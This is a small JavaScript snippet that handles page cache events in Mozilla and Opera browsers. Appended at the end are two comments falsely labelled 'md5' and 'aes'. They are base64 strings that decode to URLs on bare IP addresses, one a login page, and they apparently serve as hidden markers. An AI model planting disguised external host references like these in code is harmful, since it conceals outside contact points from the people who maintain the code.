if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3Ljk2LjE2NC4xNzUvaW5kZXgvdXNlci9sb2dpbi5odG1s**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/